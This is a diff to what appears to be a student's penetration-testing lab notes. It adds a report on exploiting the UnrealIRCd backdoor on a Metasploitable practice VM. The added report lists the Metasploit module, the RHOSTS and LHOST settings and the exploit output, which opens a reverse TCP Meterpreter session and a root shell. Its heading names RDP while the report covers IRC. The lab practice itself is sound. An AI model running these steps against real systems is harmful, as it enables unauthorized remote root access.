@@ -1060,6 +1060,7 @@ Report status:
 
 
 #####
+4.
 Port 5900 VNC (Virtual Network Computing)
 Frequently misconfigured with weak passwords or entirely unauthenticated "view/control" access, which gives an attacker instant UI control over the operating system
 ==========================
@@ -1153,11 +1154,115 @@ Report status:
 ==========================
 #####
 
+#####
+5.
+Port 3389 RDP (Remote Desktop) Vulnerable to worms and pre-authentication RCE flaws if left unpatched.
 
+==========================
+PENETRATION TESTING REPORT: SERIAL-NUMBER 05.
+==========================
+Date: [05 Nov 2026]
+Status: [Closed]
+Finding: [Vulnerability name] - [irc UnrealIRCd / Port 6667]
+Target: [192.168.56.103 / metasploitable]
+Result: [Successful exploitation]
 
-TCP 3389	RDP (Remote Desktop)	Vulnerable to worms and pre-authentication RCE flaws if left unpatched (such as BlueKeep / CVE-2019-0708).
+1. OBJECTIVE
+------------
+[Get target access to target shell or meterpreter. Basically execute RCE state on the target machine.]
 
-TCP 80 / 443 / 8080	HTTP / HTTPS (Web Services)	The widest attack surface. RCE happens easily here due to vulnerable web applications, outdated CMS platforms (WordPress, Drupal), or web server software flaws (e.g., Apache, Nginx, or enterprise appliances running vulnerable APIs).
+2. METHODOLOGY
+--------------
+1. Target discovery:
+   [sudo netdiscover; 192.168.56.103]
+
+2. Attacker IP identification:
+   [uname -a;
+    Linux kali 7.1.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.1.5-1kali1 (2026-07-29) x86_64 GNU
+    Linux,
+    sudo ifconfig; 192.168.56.102]
+
+3. Service enumeration:
+   [sudo nmap -sV 192.168.56.103; 6667/tcp open irc UnrealIRCd]
+
+4. Vulnerability research:
+   [CVE-2010-2075; https://www.cve.org/CVERecord?id=CVE-2010-2075,
+    https://en.wikipedia.org/wiki/IRC, https://www.unrealircd.org/docs/Main_Page,
+    msf > search type:Exploit irc unreal]
+
+5. Exploit selection:
+   [msf > search type:Exploit irc unreal; exploit/unix/irc/unreal_ircd_3281_backdoor, 
+    UnrealIRCD 3.2.8.1 Backdoor Command Execution]
+
+6. Exploit configuration:
+   [	msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.56.103
+	RHOSTS => 192.168.56.103
+	msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.56.102
+	LHOST => 192.168.56.102]
+
+7. Exploitation:
+   [	msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
+	
+	[*] Started reverse TCP handler on 192.168.56.102:4444 
+	[*] 192.168.56.103:6667 - Running automatic check ("set AutoCheck false" to disable)
+	[*] 192.168.56.103:6667 - Connected to 192.168.56.103:6667
+	[*] 192.168.56.103:6667 - Trying to register a new IRC user: kiersten
+	[+] 192.168.56.103:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
+	[*] 192.168.56.103:6667 - Connected to 192.168.56.103:6667
+	[*] 192.168.56.103:6667 - Sending IRC backdoor command
+	[*] Sending stage (1079144 bytes) to 192.168.56.103
+	[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.103:37237) at 2026-11-05 12:26:25 +0000
+
+	meterpreter >
+   ]
+
+8. Post-exploitation verification:
+   [	
+   	meterpreter > getuid
+	Server username: root
+	meterpreter > 
+	meterpreter > shell
+	Process 5369 created.
+	Channel 1 created.
+	whoami
+	root
+	uname -a 
+	Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+	]
+
+3. RESULTS
+----------
+
+TARGET SYSTEM INFORMATION
+-------------------------
+Hostname:     [metasploitable]
+Operating OS: [Linux metasploitable 2.6.24-16]
+Architecture: [i686 GNU/Linux]
+Session type: [Shell and Meterpreter]
+
+Vulnerability identified:
+[Vulnerability; CVE-2010-2075, irc UnrealIRCd / Port 6667.]
+
+Exploitation result:
+[msfconsole started a reverse tcp handler on host-attack machine, connecting with the target machine. Then it registered itself as a user. using that to connect with the target machine. after that the is sended a irc backdoor command and also the payload with it, thereby opening a meterpreter session on root level.]
+
+Access obtained:
+[Command shell / Meterpreter]
+
+Privilege level:
+[User account and Root]
+
+4. CONCLUSION
+-------------
+[The objective was to exploit an open port service using an existing exploit within the msfconsole and thereby gaining RCE to the target machine. I did that by researching about the service and searching for the existing exploit in the host attacking machine database. After that i executed in accordance with procedure the exploit on the target machine and was thereby successful in my exploit. Basically i hacked a virtual pc, AGAAIN:D.]
+
+5. FINAL STATUS
+---------------
+Report status:
+[Closed]
+#####
+Finally done!. Hacked 5 times using different Exploits.
+################################
 
 ################################
 
